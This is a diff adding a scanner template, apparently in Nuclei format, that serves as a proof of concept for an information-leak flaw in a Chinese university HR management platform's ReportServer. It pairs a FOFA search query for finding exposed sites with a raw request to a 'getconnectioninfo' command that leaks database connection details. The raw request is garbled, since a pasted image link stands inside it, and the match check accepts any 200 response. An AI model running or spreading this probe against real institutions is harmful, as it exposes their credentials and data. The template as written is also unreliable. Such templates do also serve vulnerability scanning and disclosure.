@@ -1,0 +1,21 @@
+id: poc-bx2nqqi35fcba2x2
+info:
+  name: 大学高校人力资源管理服务平台系统ReportServer存在敏感信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bx2nqqi35fcba2x2'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bx2nqqi35fcba2x2
+    fofa: body="FM_SYS_ID" || body="product/recruit/website/RecruitIndex.jsp"
+http:
+- raw:
+  - 'GET /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo HTTP/1.1
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077427389-1f269be7-bef5-4199-8c99-77587f8484b1.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
